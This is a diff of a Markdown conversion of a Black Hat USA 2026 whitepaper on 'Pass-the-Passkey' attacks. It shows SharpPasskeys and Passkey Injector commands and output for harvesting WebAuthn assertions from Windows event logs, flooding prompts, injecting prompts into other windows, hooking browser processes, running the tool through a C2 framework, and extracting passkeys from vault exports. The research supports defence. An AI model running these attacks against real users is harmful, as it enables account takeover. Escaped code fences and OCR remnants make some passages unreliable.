@@ -1,5 +1,5 @@
 ---
-title: "Pass-the-Passkey Family of Attacks-WP"
+title: "Pass-the-Passkey Family of Attacks"
 speakers: ["Michael Grafnetter"]
 conference: "Black Hat"
 conference_full: "Black Hat USA 2026"
@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks-WP.pdf"
 pages: 73
 sha256: "c8b28d049aace7e8588f1b1efaba73ed326323fc8547522e1a07338a4c9ff44f"
-text_chars: 115407
+text_chars: 114332
 ocr_pages: 1
 has_ocr: true
 redacted_secrets: 1
+ocr_confidence: 84.0
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:12:41Z"
+converted_at: "2026-08-12T05:38:40Z"
 ---
-# Pass-the-Passkey Family of Attacks-WP
+# Pass-the-Passkey Family of Attacks
 
 **Speakers:** Michael Grafnetter  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks-WP.pdf` (73 pages)
+
 
 ## Slide 1
 
@@ -628,19 +633,19 @@ The logged JSON payload is actually the PublicKeyCredential data structure conta
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 <Eventxmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-```
+\```
 
-```
+\```
 <System>
-```
+\```
 
-```
+\```
 <ProviderName="Microsoft-Windows-WebAuthN"
-```
+\```
 
-```
+\```
 Guid="{3ae1ea61-c002-47fb-b06c-4022a8c98929}"/>
 <EventID>2106</EventID>
 <Version>0</Version>
@@ -650,49 +655,49 @@ Guid="{3ae1ea61-c002-47fb-b06c-4022a8c98929}"/>
 <Keywords>0x8000000000000002</Keywords>
 <TimeCreatedSystemTime="2026-01-20T23:19:01.4449382Z"/>
 <EventRecordID>16938</EventRecordID>
-```
+\```
 
-```
+\```
 <CorrelationActivityID="{0f018d42-8382-4fff-a19f-d1ab00000000}"/>
-```
+\```
 
-```
+\```
 <ExecutionProcessID="32708"ThreadID="12676"/>
 <Channel>Microsoft-Windows-WebAuthN/Operational</Channel>
-```
+\```
 
-```
+\```
 <Computer>CONTOSO-PC1</Computer>
-```
+\```
 
-```
+\```
 <SecurityUserID="S-1-5-21-1084105731-826279734-3585910670-1327"/>
-```
+\```
 
-```
+\```
 </System>
 <EventData>
-```
+\```
 
-```
+\```
 <DataName="Name">authenticationResponseJSON</Data>
-```
+\```
 
-```
+\```
 <DataName="Value">
 {"authenticatorAttachment":"platform",
 "clientExtensionResults":{},
-```
+\```
 
-```
+\```
 "id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
-```
+\```
 
-```
+\```
 "rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
-```
+\```
 
-```
+\```
 "response":{"authenticatorData":"NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAg",
 "clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYV
 5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtsc1FtcFhSR3MwVWpGbk1
@@ -709,29 +714,29 @@ aRXhpY0ZCTVRVNHdjakUxUlcxaFZVUTNRVmR6Y0dnM1gydG9kMHcyTm1oMGFtbGhPR295Um04dFNYSkZ
 tWm01T1NWZGFaSFV0Tm1acGNYaHdia1paVDI5R1JsQjJXamRKUXpOaFoyaGlVSGhtWXpCWk1GWklabXhyWkU
 5bFoweG1jVEo0UVZkblVHdzViRU5uVEhkbiIsIm9yaWdpbiI6Imh0dHBzOi8vbG9naW4ubWljcm9zb2Z0LmN
 vbSIsImNyb3NzT3JpZ2luIjpmYWxzZX0",
-```
+\```
 
-```
+\```
 "signature":"MEUCIA8EKq1vxqcXzZmXR55iX_Joodr_4r8PBvBk0v03iKhaAiEA_2A1_0WHAjZFPMwJH0P
-```
+\```
 
-```
+\```
 1YjqPSz71Vxe9iX4lIco29tc",
-```
+\```
 
-```
+\```
 "userHandle":"0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"},
-```
+\```
 
-```
+\```
 "type":"public-key"}
-```
+\```
 
-```
+\```
 </Data>
 </EventData>
 </Event>
-```
+\```
 
 The event includes the browser process ID and user SID, identifying the actor performing the passkey
 
@@ -743,7 +748,7 @@ The event includes the browser process ID and user SID, identifying the actor pe
 
 authentication, but the most important part is the JSON payload:
 
-```
+\```
 {
 "authenticatorAttachment":"platform",
 "clientExtensionResults":{},
@@ -772,11 +777,11 @@ YjqPSz71Vxe9iX4lIco29tc",
 },
 "type":"public-key"
 }
-```
+\```
 
 After decoding the `clientDataJSON` field from Base64Url format, we obtain another JSON structure:
 
-```
+\```
 {
 "type":"webauthn.get",
 "origin":"https://login.microsoft.com",
@@ -792,7 +797,7 @@ tQjYxVW9iMU0zWjJpcms5d2g1Vzhaa3U0UGc4bnJydDhncmhyZExicFBMTU4wcjE1RW1hVUQ3QVdzcGg
 w2Nmh0amlhOGoyRm8tSXJFTy1mZm5OSVdaZHUtNmZpcXhwbkZZT29GRlB2WjdJQzNhZ2hiUHhmYzBZMFZIZmxrZ
 E9lZ0xmcTJ4QVdnUGw5bENnTHdn"
 }
-```
+\```
 
 The `origin` field identifies the relying party (i.e., the cloud service).
 
@@ -806,9 +811,9 @@ The following filter XML locates these events in the Windows Event Log:
 
 `<` **`QueryList`** `> <` **`Query`** `Id="0" Path="Microsoft-Windows-WebAuthN/Operational"> <` **`Select`** `>*[System[EventID=2106] and` ↪ `EventData[Data[@Name='Name']='authenticationResponseJSON`n']]</` **`Select`** `> </` **`Query`** `>`
 
-```
+\```
 </QueryList>
-```
+\```
 
 **Note** Windows incorrectly puts a newline character ( `\n` ) at the end of the `authenticationResponseJSON` field in the event log. The filter XML above accounts for this quirk. Unfortunately, it only works in PowerShell or the Win32 API, but not in the Event Viewer GUI.
 
@@ -850,13 +855,13 @@ We have verified that none of these checks are performed by Microsoft Entra ID (
 
 The Get-PasskeyAssertionEvent.ps1 PowerShell script demonstrates the issue by retrieving recent WebAuthn assertions from a remote Windows event log and decoding the `origin` value from each assertion’s `clientDataJSON` :
 
-```
+\```
 .\Get-PasskeyAssertionEvent.ps1-ComputerName'CONTOSO-PC1'
-```
+\```
 
 Sample script output (truncated):
 
-```
+\```
 TimeCreated:1/21/202612:19:01AM
 MachineName:CONTOSO-PC1
 ProcessId:32708
@@ -864,7 +869,7 @@ UserID:S-1-5-21-1084105731-826279734-3585910670-1327
 UserName:CONTOSO\alice
 Origin:https://login.microsoft.com
 PublicKeyCredential:{"authenticatorAttachment":"platform",...,"type":"public-key"}
-```
+\```
 
 As a next step, the retrieved `PublicKeyCredential` JSON payload can be passed to the Passkey Injector tool to impersonate the user. The entire process could be fully automated by extending the PowerShell script.
 
@@ -874,24 +879,24 @@ We also looked at the WebAuthn PRF (Pseudo-Random Function) extension, which is 
 
 To our disappointment, it seems that Microsoft engineers were fully aware of the security implications of leaking these encryption keys and decided to redact the `prf` field in the logged assertions:
 
-```
+\```
 {
-```
+\```
 
-```
+\```
 "authenticatorAttachment":"platform",
-```
+\```
 
-```
+\```
 "clientExtensionResults":{
 "prf":{}
 },
 "id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
 "rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
 "response":{
-```
+\```
 
-```
+\```
 "authenticatorData":"NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAZQ",
 "clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5
 cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtscVZsQmFhbXhSVGxWWk5Wb3
@@ -899,7 +904,7 @@ dUa1JrTUU1MFVtcEtRMVF3YUVsbFJWSkZWVk14UldGNVNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSl
 YlRsNllqSmFNRTl0V25CYVJ6ZzJXVEpvYUdKSGVHeGliV1JzU1dsM2FXRllUbnBKYW05cFlVaFNNR05JVFRaTW
 VUbHpZakprY0dKcE5YUmhWMDU1WWpOT2RscHVVWFZaTWpsMFNXbDNhV0ZYUmpCSmFtOTRUbXBCTlUxcVl6Tk9W
 RkUwVEVOS2RWbHRXV2xQYWtVeVRVUnJlVTU2WXpGT1JHZHpTVzFXTkdORFNUWk5WRmwzVDFSSk0wNTZaekJQU0
-```
+\```
 
 **24**
 
@@ -907,7 +912,7 @@ RkUwVEVOS2RWbHRXV2xQYWtVeVRVUnJlVTU2WXpGT1JHZHpTVzFXTkdORFNUWk5WRmwzVDFSSk0wNTZa
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 RBdWJETnllRjlKVG5OTFQwaHNaVFI1YXpkdlNtazNNRzB5TVVOc1YybFdXa2xKTUd4UmRWaEpiV1owTjFSTVgw
 cHBjVFJwYzBVemEwNXZSalI2WDBjeVlsRmhkRGRhT0c1NWRWUlphbU5rVG1zeFNtNU9UMGsxWlhCTU1VSXdOa1
 I0TjIxT1UwNXNaM1psV1doS1IwNWZhVkI0UkMxbE9WSmtWWEp2TmpsUExXeDFjSFJQVWpWUVgzQjZkVXBXVTBk
@@ -919,14 +924,14 @@ a1Z1ZUZwbiIsIm9yaWdpbiI6Imh0dHBzOi8vbG9naW4ubWljcm9zb2Z0LmNvbSIsImNyb3NzT3JpZ2lu
 xzZX0",
 "signature":"MEUCIQC43iMRBhvOfvnX4B559FFLmLVmf3QepJL5wYaamFjzTQIgDn5e-cX64YFGzbT9KM6Bz
 7W9UNoMmsTocqM_2889T18",
-```
+\```
 
-```
+\```
 "userHandle":"0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"
 },
 "type":"public-key"
 }
-```
+\```
 
 #### **3.1.6 Fix**
 
@@ -1010,7 +1015,7 @@ The Microsoft Entra ID engineering team decided to forgo certain security checks
 
 Here is a sample WebAuthn challenge issued by Microsoft Entra ID:
 
-```
+\```
 Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJMU5pSXNJbmcxZENJNklsQmpXRGs0UjFnME1q
 QlVNVmcyYzBKRWEzcG9VVzF4WjNkTlZTSjkuZXlKaGRXUWlPaUoxY200NmJXbGpjbTl6YjJaME9tWnBa
 Rzg2WTJoaGJHeGxibWRsSWl3aWFYTnpJam9pYUhSMGNITTZMeTlzYjJkcGJpNXRhV055YjNOdlpuUXVZ
@@ -1021,11 +1026,11 @@ SzN4VFV0SEJyNUFHc084MUFHRjhkT3cyd3ZNVTFKTWJaY0VraV9Qa3dzaUdBcG1Gd2M3Tmc2dmg5b0JY
 QTJOdExONnZBaUNSSU9XX1ZYRlpOWXF2Nkl4eUpLZG5SVDNJMGRjVkFnNlM4OE5YRGNoYU84b1E0YTNB
 RlFLYThBRjItaHN0YVBlemM4QWx3YkkyaUFBSEFaWHhLazFyWVdXcUVVVzlucW1PT1pIVk1GMDliN0FZ
 X1pjdHJYY0kwdHlYU0lUYW1fb1U1M3R3cVBpN3B6c09EU0NaZG9WWGxRSEcxQ2pld2VpTXQyLUh3
-```
+\```
 
 After decoding it from the Base64 format, we get a well-formed JWT structure prepended with the non-standard leading `O.` sequence:
 
-```
+\```
 O.eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlBjWDk4R1g0MjBUMVg2c0JEa3poUW1xZ3dNVSJ9.
 eyJhdWQiOiJ1cm46bWljcm9zb2Z0OmZpZG86Y2hhbGxlbmdlIiwiaXNzIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3
 NvZnQuY29tIiwiaWF0IjoxNzY4OTQ3NTQ3LCJuYmYiOjE3Njg5NDc1NDcsImV4cCI6MTc2ODk0Nzg0N30.
@@ -1033,7 +1038,7 @@ Id8aC25t2klccuwG9Sr8os5OwNPtLQX_oeDFMXmJhy8iJMMyogwzu-PfG7st9nsPVGONES7ixfgleBe6
 i18zzcnlbFBI84Xz09_K3xTUtHBr5AGsO81AGF8dOw2wvMU1JMbZcEki_PkwsiGApmFwc7Ng6vh9oBXA2NtLN6
 vAiCRIOW_VXFZNYqv6IxyJKdnRT3I0dcVAg6S88NXDchaO8oQ4a3AFQKa8AF2-hstaPezc8AlwbI2iAAHAZXxK
 k1rYWWqEUW9nqmOOZHVMF09b7AY_ZctrXcI0tyXSITam_oU53twqPi7pzsODSCZdoVXlQHG1CjeweiMt2-Hw
-```
+\```
 
 After decoding the Base64Url-encoded UTF-8 strings, we obtain the following JWT header and payload:
 
@@ -1043,15 +1048,15 @@ After decoding the Base64Url-encoded UTF-8 strings, we obtain the following JWT 
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 {
 "typ":"JWT",
 "alg":"RS256",
 "x5t":"PcX98GX420T1X6sBDkzhQmqgwMU"
 }
-```
+\```
 
-```
+\```
 {
 "aud":"urn:microsoft:fido:challenge",
 "iss":"https://login.microsoft.com",
@@ -1059,7 +1064,7 @@ After decoding the Base64Url-encoded UTF-8 strings, we obtain the following JWT 
 "nbf":1768947547,
 "exp":1768947847
 }
-```
+\```
 
 The JWT payload indicates that the challenge is valid for only five minutes. However, our tests have shown that Microsoft Entra ID accepts challenges for up to ten minutes after issuance, apparently to account for possible time skew between systems. Using an expired challenge results in an authentication failure. Still, the ten-minute validity period provides a sufficient window for an attacker to capture and replay a signed challenge. In fact, even 30 seconds would be enough for fully automated attacks. A proper replay check is a must.
 
@@ -1079,7 +1084,7 @@ Microsoft Entra ID does not track or enforce signature counters for WebAuthn ass
 
 Before Microsoft retired the Azure AD Graph API, it was possible to retrieve the initial signature counter value for each registered passkey in an Entra ID tenant using the DSInternals PowerShell module:
 
-```
+\```
 Install-Module-NameAzureAD,DSInternals-Force
 Connect-AzureAD
 $tokens=[Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens
@@ -1089,7 +1094,7 @@ Where-ObjectEnabled-eq$true|
 Select-Object-ExpandPropertyKeyCredentials|
 Where-ObjectUsage-eqFIDO|
 Format-Table-ViewFIDO
-```
+\```
 
 Sample output:
 
@@ -1181,18 +1186,18 @@ The Invoke-PasskeyCircuitBreaker.ps1 script is a proof-of-concept PowerShell scr
 
 Here is sample output from the script (redacted for brevity):
 
-```
+\```
 .\Invoke-PasskeyCircuitBreaker.ps1-Suspend-BlockTraffic-Verbose
-```
+\```
 
-```
+\```
 ListeningforWebAuthNassertionresponseevents...PressCtrl+Ctostop.
 VERBOSE:Blockedoutboundtrafficfor:C:\ProgramFiles(x86)\Microsoft\Edge\
 Application\msedge.exe
 CapturedWebAuthnassertionrequest:
-```
+\```
 
-```
+\```
 EventId:1103
 Time:6/30/202611:04:10AM
 UserSid:S-1-5-21-3288850392-3299536932-2614793081-1000
@@ -1201,16 +1206,16 @@ ProcessId:9396
 ProcessName:msedge
 ThreadId:7632
 RpId:login.microsoft.com
-```
+\```
 
-```
+\```
 VERBOSE:Process9396suspended.
 VERBOSE:Unblockedoutboundtrafficfor:C:\ProgramFiles(x86)\Microsoft\Edge\
 Application\msedge.exe
 CapturedWebAuthnassertionresponse:
-```
+\```
 
-```
+\```
 EventId:2106
 Time:6/30/202611:04:20AM
 UserSid:S-1-5-21-3288850392-3299536932-2614793081-1000
@@ -1223,7 +1228,7 @@ PublicKeyCredential:
 {"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",...,"type":"public-key"}
 Stoppingtheeventwatcher...
 VERBOSE:Process9396resumed.
-```
+\```
 
 **32**
 
@@ -1279,14 +1284,13 @@ The operator then sends the generated command to the victim’s computer over th
 
 **35**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PASS-THE-PASSKEY FAMILY OF ATTACKS
-INTERACT IP HOST WUSER IDOMAIN PID LAST CHECKIN _ll DESCRIPTION o
 $10.101.0.123 CANARY ‘Admin CANARY 13196 a few seconds Created by mythic_admin at 2026-04-02 13:21:36
 $172.26.128.1 _ CONTOSO-PC1 Admin contoso 11376 1. seconds Created by mythic_admin at 2026-04-02 13:21:36 | R%
-WINil X
 Arguments prompt --relying-
 execute_assembly -Assembly SharpPasskeys.exe -Arguments prompt --relying-party login.microsoft.com --flood --hwnd 0 --authenticator Clie
 ntDevice --challenge Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2IPaUpTVXpJMUSpSXNJbmcxZENJNKlsaDBMVzgzYUVSaWNIVndRWG90V2xCd
@@ -1305,17 +1309,7 @@ Passkeys[@] Prompt failed: t canceled
 Passkeys[@] Prompt attempt @: 2
 Passkeys[@] Prompt failed: The operation was canceled by the user
 Prompt attempt 7 (00:28 elapsed)...
-"HP -qnJGc7Zn0yZuH-81g1.IQuY- JExgfEKKAHTN61USQ" ,"rawId” : "HP-qn.JGc7ZnOyZuH-8191.IQUY - JExgFEKKAHTH61USQ"
 execute_assembly -Assembly SharpPass type" : "public-key", "authenticatorAttachment”: "platform" , "response”:{"authenticatorData"
-Nhlye1KCTIb1pXx6vkYID8bVFaJ2mH7yWGEwVFdpoDIEFAAAAAA" , "signature"
-EOsbbRQXTk2GUDVS9x_1djC6aT990ateXEyj1PcDtJBC2IUC7SXqLhHwpHpG1GhVF ir CxPEWEtDII4iFdy7EaoLI txqhH6xcOQkDE
-44. 8m3AnKn-ZSqI -B3Uhr uY35gHFn76RF pOGcwmiWTZOFpjODvas Lm1xkNHrNtSDyy2l_GePRwkKRoVdiEsmSNVQAZ8Dr XqCSyLUUOPpEC
-2DmCEOnsdX9yL4RFns89FGzTSEVB6K8gE1LwnCqJb2CwSWB2MBp1qLgVxBjOQTBSeSt jcxkMQNyCMHsgzLfn3uTTTLgOWnat2zv3bZcIk
-EXpGnuTcI@rEfGOBeEVGJOFDFQcrg"," *T046LOGSa4P27U0j jNSbM97IGVU2K7EsIHBwPe_GH
-y 02:55 P 1 -BagSbSLi_isBXi7v2zSOEHI18T", "cli
-acantoa lancer ee aseericy sitmr aes ey J8eXBLI joid2ViVxXVOaG4uZ2VOTiwi Y2hhbGxLbmd LI joiVHk 1bGVVb3daVmhCYVUSCFNrdFANVKZWVEVOS2FHSkhZMmxQ)
-YcEpNVTVwU1hOSmItY3haRUSKTmtsc2FEQk 1Wemd6WVVWU2FXTkLbmRSVOcSMF¥yeENKRTVyYURSUk 1GcF LNWHBPYWxOVENGa’
-VIACHEVVREBAIMOALT TusMEE#CT hi D2BAVI DENT Tn CmENDTT AV IECV IE? 2 WE ns VI lAY EMU $014 Tot eM EVO Tha BYVUIAE HET
 execute_assembly -Assembly SharpPass
 keys.exe -Arguments list hello
 screenshot
@@ -1326,7 +1320,6 @@ keys.exe -Arguments list hello
 screenshot
 keys.exe -Arguments prompt --relying-
 a
-(Dir: C:\Users\Admin\Downloads
 Figure 14: SharpPasskeys Executed through the Mythic C2 Framework
 35
 ```
@@ -1361,18 +1354,18 @@ Attackers can improve their chances of success by pre-selecting the authenticato
 
 This can be achieved by specifying the `--authenticator` and `--credential-id` parameters when invoking the SharpPasskeys tool:
 
-```
+\```
 .\SharpPasskeys.exeprompt--relying-partylogin.microsoft.com`
 --challengedGVzdC1jaGFsbGVuZ2U`
 --authenticatorClientDevice`
 --credential-id5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM
-```
+\```
 
 The list of Windows Hello passkeys can be obtained by querying the Windows API:
 
-```
+\```
 SharpPasskeys.exelisthello
-```
+\```
 
 |`+---------------------+`
 `| Relying Party`
@@ -1471,16 +1464,16 @@ through the WebAuthn event log — and only then presents its own prompt. This s
 
 All variants of the attack are again implemented in the SharpPasskeys tool. Here is an example of the prompt flooding attack, which waits for a legitimate WebAuthn ceremony to complete and then repeatedly invokes its own prompt until the user confirms it or the challenge expires:
 
-```
+\```
 .\SharpPasskeys.exewait
 .\SharpPasskeys.exeprompt--relying-partylogin.microsoft.com`
 --challengeKH25uOHKDpHL8fa3WKSC`
 --authenticatorClientDevice`
 --flood`
 --hwnd0
-```
+\```
 
-```
+\```
 15:22:36info:Passkeys[0]WaitingforWebAuthnassertionrequest(timeout:10m)...
 Time:2026-06-3015:24:18
 User:contoso\Admin
@@ -1497,7 +1490,7 @@ RelyingParty:login.microsoft.com
 15:24:25fail:Passkeys[0]Promptfailed:Accessisdenied
 15:24:28info:Passkeys[0]Promptattempt5(00:08elapsed)...
 {"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",...,"type":"public-key"}
-```
+\```
 
 **40**
 
@@ -1613,10 +1606,10 @@ The WebAuthNAuthenticatorGetAssertion WIN32 API function used to display passkey
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 _In_opt_PCWEBAUTHN_AUTHENTICATOR_GET_ASSERTION_OPTIONSpWebAuthNGetAssertionOptions,
 _Outptr_result_maybenull_PWEBAUTHN_ASSERTION*ppWebAuthNAssertion);
-```
+\```
 
 The `hWnd` parameter is the handle of the parent window that will display the credential UI as a modal dialog window. We found that this parameter is not properly validated by Windows, allowing attackers to inject passkey authentication prompts into the context of another application, such as a web browser, even if the application is running under a different user account. Malicious actors can abuse this vulnerability to trick users into confirming assertion requests that they would otherwise ignore if they were displayed in the context of an unfamiliar application.
 
@@ -1624,11 +1617,11 @@ The `hWnd` parameter is the handle of the parent window that will display the cr
 
 The SharpPasskeys tool can first be used to enumerate main application windows belonging to the current user:
 
-```
+\```
 SharpPasskeys.exelisthwnd
-```
+\```
 
-```
+\```
 +------------------+------------+-------------------------------------+
 |ProcessName|Handle|WindowTitle|
 +------------------+------------+-------------------------------------+
@@ -1637,7 +1630,7 @@ SharpPasskeys.exelisthwnd
 |POWERPNT|28185102|Pass-the-Passkey.pptx-PowerPoint|
 |WindowsTerminal|12587510|Administrator:CommandPrompt|
 +------------------+------------+-------------------------------------+
-```
+\```
 
 The `--hwnd` parameter of the `prompt` command can then be used to specify the window handle of the target application:
 
@@ -1770,13 +1763,13 @@ This mode only works against relying parties that fail to enforce single-use cha
 
 The attack would start by injecting the malicious DLL into a running browser process:
 
-```
+\```
 SharpPasskeys.exehookattach
-```
+\```
 
-```
+\```
 12:34:10info:Passkeys[0]InjectedWebAuthnHook_x64.dllintomsedge(pid11804).
-```
+\```
 
 When executing the attack in Capture Mode, the hook will wait for the next assertion ceremony to start, interrupt the authentication process, and return the signed assertion:
 
@@ -1786,9 +1779,9 @@ When executing the attack in Capture Mode, the hook will wait for the next asser
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 SharpPasskeys.exehookwait--capture--rpidlogin.microsoft.com
-```
+\```
 
 |`12:34:56 info: Passkeys[0] `|`Listening `|`on \\.\pi`|`pe\WebAuthnHook for hook assertion responses`|
 |---|---|---|---|
@@ -1898,7 +1891,7 @@ Bitwarden offers three options when exporting the vault:
 
 1. **Unencrypted JSON** — the least secure option, and the default. The passkeys are written in cleartext:
 
-```
+\```
 {
 "passwordHistory":[],
 "revisionDate":"2026-04-21T14:03:33.030Z",
@@ -1913,7 +1906,7 @@ Bitwarden offers three options when exporting the vault:
 "login":{
 "uris":[
 {
-```
+\```
 
 **59**
 
@@ -1921,7 +1914,7 @@ Bitwarden offers three options when exporting the vault:
 
 **PASS-THE-PASSKEY FAMILY OF ATTACKS**
 
-```
+\```
 "uri":"https://webauthn.io/"
 }
 ],
@@ -1950,11 +1943,11 @@ s1yz0E9ie4JIv6QDGuercEnbKhztfn42kO3bWWni9f9",
 },
 "collectionIds":null
 }
-```
+\```
 
 2. **Password-protected JSON** — encrypted with a user-chosen password. Here is a redacted example of the format:
 
-```
+\```
 {
 "encrypted":true,
 "passwordProtected":true,
@@ -1966,7 +1959,7 @@ z1E573mWEfmKIyTxruUmF0xC9I9aznTMz8qPs4zh5H|j4HsZ/nvx1K4otZ4G1FR2iCZ4WQYqyAIhgbzF
 WSuS4=",
 "data":"2.R/CMPCRscUj6kdtv9GgkVg==|04MP...GGBRQ==|VpknXBXekM6DvMl...MDuEdShEyOQLA="
 }
-```
+\```
 
 3. **Account-restricted export** — encrypted against the user’s Bitwarden account so that it can only be re-imported into that same account.
 
@@ -1986,7 +1979,7 @@ The Credential Exchange Format (CXF) is an emerging standard developed by the FI
 
 Like the Bitwarden JSON export, a CXF file is a single JSON document that can hold many credentials — passwords and passkeys alike — for a given user. CXF defines the credential payload rather than an encrypted at-rest container; the specification instead requires the exporting provider or orchestrator to protect the transfer. If malware obtains a CXF payload outside that protected exchange, the passkey material in the JSON document is exposed: [6]
 
-```
+\```
 {
 "id":"8DPaLQiwSc-7n9bHKrQYTw",
 "creationAt":1705142400,
@@ -2007,7 +2000,7 @@ TH59xe_Ry6TA62ElcWhRANCAASW2KmRZiL3V0YsSF1qewZXrhQrs2HoTthHZmjSBVYyLkG-GD
 }
 ]
 }
-```
+\```
 
 The Passkey Injector tool supports the format and lets the operator pick a passkey from a CXF file when authenticating to a website that accepts passkeys.
 
